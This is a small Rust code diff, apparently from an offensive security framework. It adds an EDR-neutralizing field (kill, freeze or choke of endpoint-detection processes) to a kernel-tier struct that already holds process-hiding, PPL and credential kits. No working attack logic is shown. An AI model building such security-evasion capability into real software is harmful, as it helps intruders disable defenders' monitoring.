@@ -415,6 +415,10 @@ pub struct KernelTier {
     pub hide: Option<Box<dyn ProcHideKit>>,
     pub ppl: Option<Box<dyn PplKit>>,
     pub cred: Option<Box<dyn CredKit>>,
+    /// EDR process neutralize (Kill/Freeze/Choke). Kill needs a kernel
+    /// primitive via `EdrNeutralizer::kill(krw, pid)` directly; Freeze/Choke
+    /// are user-mode tiers that run real FFI when this is `Some`.
+    pub neutralize: Option<Box<dyn EdrNeutralizeKit>>,
 }
 
 impl KernelTier {
@@ -430,6 +434,7 @@ impl KernelTier {
             hide: None,
             ppl: None,
             cred: None,
+            neutralize: None,
         }
     }
 }
